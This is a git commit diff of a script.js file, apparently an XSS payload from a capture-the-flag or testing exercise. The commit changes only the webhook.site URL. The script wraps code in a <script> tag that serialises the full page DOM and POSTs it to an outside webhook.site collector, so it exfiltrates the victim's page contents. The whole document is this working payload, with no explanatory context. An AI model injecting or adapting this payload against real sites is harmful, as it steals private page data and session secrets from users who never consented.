61162e1aa833b3fd317579ecc25c0a443052dea2
Alexandre Poirrier <57712732+apoirrier@users.noreply.github.com>
2020-11-01 23:38:09 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,6 @@
 <script>
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://webhook.site/5d002a10-23f5-4946-a997-3cac4c81d807", true);
+xhr.open("POST", "https://webhook.site/b0062056-f338-4b5a-a2fb-044aa09f1644", true);
 var text = new XMLSerializer().serializeToString(document);
 xhr.send(JSON.stringify({
     "a": text
